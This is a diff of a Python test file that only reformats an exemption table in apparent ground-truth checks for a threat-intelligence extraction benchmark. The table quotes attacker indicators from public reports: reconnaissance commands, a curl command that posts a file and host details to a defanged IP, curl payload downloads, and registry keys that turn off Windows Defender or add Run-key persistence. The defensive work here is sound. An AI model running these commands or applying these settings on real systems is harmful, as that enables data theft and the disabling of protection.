@@ -28,22 +28,86 @@ SUBAGENTS = [
 
 PROCESS_LINEAGE_EXEMPTION = "synthesized parent-to-child process pairs are not literal fixture substrings"
 REACHABILITY_EXEMPTIONS = {
-    ("cmdline", "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793", "chcp 65001 > NUL & netstat -afn -p TCP"): "fixture de-escapes the query value",
-    ("cmdline", "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793", 'chcp 65001 > NUL & wmic datafile where Name="C:\\Windows\\system32\\ntoskrnl.exe" get Version'): "fixture de-escapes the query value",
-    ("cmdline", "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793", "chcp 65001 > NUL & echo %userdomain%*%computername%**%username%"): "fixture de-escapes the query value",
-    ("cmdline", "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793", "chcp 65001 > NUL & tasklist"): "fixture de-escapes the query value",
-    ("cmdline", "https://www.proofpoint.com/us/blog/threat-insight/bitter-end-unraveling-eight-years-espionage-antics-part-one", 'curl -X POST -F "file=@C:\\programdata\\abc1.pdf" hxxp://46.229.55[.]63/svupfl.php?oi=%computername%_%username%'): "source strips rendered angle brackets from a defanged URL",
-    ("cmdline", "https://www.proofpoint.com/us/blog/threat-insight/bitter-end-unraveling-eight-years-espionage-antics-part-one", "curl -o sh2.txt hxxp://173.254.204[.]72/sh2.txt"): "source strips rendered angle brackets from a defanged URL",
-    ("cmdline", "https://www.proofpoint.com/us/blog/threat-insight/bitter-end-unraveling-eight-years-espionage-antics-part-one", "curl -o dune64.log http://173.254.204[.]72/dune64.log"): "source strips rendered angle brackets from a defanged URL",
-    ("registry_artifacts", "https://www.huntress.com/blog/cephalus-ransomware", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableScanOnRealtimeEnable"): "ground truth composes key and value fields",
-    ("registry_artifacts", "https://www.huntress.com/blog/cephalus-ransomware", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring"): "ground truth composes key and value fields",
-    ("registry_artifacts", "https://www.huntress.com/blog/cephalus-ransomware", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware"): "ground truth composes key and value fields",
-    ("registry_artifacts", "https://www.huntress.com/blog/cephalus-ransomware", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableBehaviorMonitoring"): "ground truth composes key and value fields",
-    ("registry_artifacts", "https://www.huntress.com/blog/cephalus-ransomware", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableOnAccessProtection"): "ground truth composes key and value fields",
-    ("registry_artifacts", "https://www.microsoft.com/en-us/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/", "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\TASK_NAME"): "ground truth composes key and value fields",
-    ("registry_artifacts", "https://www.microsoft.com/en-us/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/", "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{GUID}"): "ground truth composes key and value fields",
-    ("registry_artifacts", "https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"): "ground truth composes key and value fields",
-    ("registry_artifacts", "https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\App"): "ground truth composes key and value fields",
+    (
+        "cmdline",
+        "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793",
+        "chcp 65001 > NUL & netstat -afn -p TCP",
+    ): "fixture de-escapes the query value",
+    (
+        "cmdline",
+        "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793",
+        'chcp 65001 > NUL & wmic datafile where Name="C:\\Windows\\system32\\ntoskrnl.exe" get Version',
+    ): "fixture de-escapes the query value",
+    (
+        "cmdline",
+        "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793",
+        "chcp 65001 > NUL & echo %userdomain%*%computername%**%username%",
+    ): "fixture de-escapes the query value",
+    (
+        "cmdline",
+        "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793",
+        "chcp 65001 > NUL & tasklist",
+    ): "fixture de-escapes the query value",
+    (
+        "cmdline",
+        "https://www.proofpoint.com/us/blog/threat-insight/bitter-end-unraveling-eight-years-espionage-antics-part-one",
+        'curl -X POST -F "file=@C:\\programdata\\abc1.pdf" hxxp://46.229.55[.]63/svupfl.php?oi=%computername%_%username%',
+    ): "source strips rendered angle brackets from a defanged URL",
+    (
+        "cmdline",
+        "https://www.proofpoint.com/us/blog/threat-insight/bitter-end-unraveling-eight-years-espionage-antics-part-one",
+        "curl -o sh2.txt hxxp://173.254.204[.]72/sh2.txt",
+    ): "source strips rendered angle brackets from a defanged URL",
+    (
+        "cmdline",
+        "https://www.proofpoint.com/us/blog/threat-insight/bitter-end-unraveling-eight-years-espionage-antics-part-one",
+        "curl -o dune64.log http://173.254.204[.]72/dune64.log",
+    ): "source strips rendered angle brackets from a defanged URL",
+    (
+        "registry_artifacts",
+        "https://www.huntress.com/blog/cephalus-ransomware",
+        "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableScanOnRealtimeEnable",
+    ): "ground truth composes key and value fields",
+    (
+        "registry_artifacts",
+        "https://www.huntress.com/blog/cephalus-ransomware",
+        "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring",
+    ): "ground truth composes key and value fields",
+    (
+        "registry_artifacts",
+        "https://www.huntress.com/blog/cephalus-ransomware",
+        "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware",
+    ): "ground truth composes key and value fields",
+    (
+        "registry_artifacts",
+        "https://www.huntress.com/blog/cephalus-ransomware",
+        "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableBehaviorMonitoring",
+    ): "ground truth composes key and value fields",
+    (
+        "registry_artifacts",
+        "https://www.huntress.com/blog/cephalus-ransomware",
+        "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableOnAccessProtection",
+    ): "ground truth composes key and value fields",
+    (
+        "registry_artifacts",
+        "https://www.microsoft.com/en-us/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/",
+        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\TASK_NAME",
+    ): "ground truth composes key and value fields",
+    (
+        "registry_artifacts",
+        "https://www.microsoft.com/en-us/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/",
+        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{GUID}",
+    ): "ground truth composes key and value fields",
+    (
+        "registry_artifacts",
+        "https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/",
+        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+    ): "ground truth composes key and value fields",
+    (
+        "registry_artifacts",
+        "https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/",
+        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\App",
+    ): "ground truth composes key and value fields",
 }
 
 
@@ -93,7 +157,9 @@ def test_ground_truth_entry_schema(subagent):
             assert isinstance(acceptable, dict), f"{subagent}[{i}].acceptable_items[{j}]: entry must be an object"
             value = acceptable.get("value")
             justification = acceptable.get("justification")
-            assert isinstance(value, str) and value.strip(), f"{subagent}[{i}].acceptable_items[{j}]: value must be non-blank"
+            assert isinstance(value, str) and value.strip(), (
+                f"{subagent}[{i}].acceptable_items[{j}]: value must be non-blank"
+            )
             assert isinstance(justification, str) and justification.strip(), (
                 f"{subagent}[{i}].acceptable_items[{j}]: justification must be non-blank"
             )
